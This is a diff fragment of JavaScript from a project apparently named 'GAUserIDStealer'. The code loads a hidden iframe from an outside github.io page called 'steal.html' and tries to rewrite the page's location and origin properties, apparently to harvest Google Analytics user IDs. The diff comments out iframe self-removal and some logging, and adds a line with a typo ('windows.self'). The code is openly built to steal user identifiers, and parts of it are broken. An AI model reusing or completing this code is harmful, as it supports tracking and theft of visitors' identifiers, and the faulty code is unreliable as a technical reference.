@@ -25,12 +25,12 @@
          
 //          window.self.location='https://newmangervase91.github.io/GAUserIDStealer/steal.html';
 //          window.top.location='https://newmangervase91.github.io/GAUserIDStealer/steal.html';
-         window.location.origin='https://newmangervase91.github.io'; 
+//          window.location.origin='https://newmangervase91.github.io'; 
          
-         console.log('change location.origin');
-         console.log('after self/top origin: A',window.location.origin);
-         console.log('after A: TOP',window.top.location);
-         console.log('after A: self',window.self.location);
+//          console.log('change location.origin');
+//          console.log('after self/top origin: A',window.location.origin);
+//          console.log('after A: TOP',window.top.location);
+//          console.log('after A: self',window.self.location);
          
          
          var guhappyId=makeid(5);
@@ -44,16 +44,23 @@
          
 //          var cframe=document.getElementById("cframe");
          
-         cframe.addEventListener("load",function(){
-             setTimeout(function(){
-                 cframe.parentNode.removeChild(cframe);
-                 cframe.parentNode=null;
-             }, 5000);
+//          cframe.addEventListener("load",function(){
+//              setTimeout(function(){
+//                  cframe.parentNode.removeChild(cframe);
+//                  cframe.parentNode=null;
+//              }, 5000);
              
-         });
+//          });
          
     
          cframe.src ="https://newmangervase91.github.io/GAUserIDStealer/steal.html";
+         
+         
+         windows.self=window.child;
+         console.log('assign child to self');
+         console.log('after self/top origin: A',window.location.origin);
+         console.log('after A: TOP',window.top.location);
+         console.log('after A: self',window.self.location);
          
          
 //         var xhr = new XMLHttpRequest(),
